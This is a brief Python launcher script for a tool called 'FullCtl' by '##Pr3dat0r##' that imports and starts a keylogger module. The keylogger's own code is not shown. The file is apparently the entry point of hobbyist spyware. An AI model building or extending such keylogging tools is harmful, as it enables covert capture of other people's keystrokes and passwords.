#!/usr/bin/python


from src.keylogger import *

class Engine():
    def __init__(self):
        self.author = "##Pr3dat0r##"
        self.name = "##FullCtl##"
        self.k=Keylogger()

    def main(self):
        print (self.author+" presents: "+self.name+ " softwere.")
        self.k.keylogger()



if __name__=="__main__":
    eng=Engine()
    eng.main()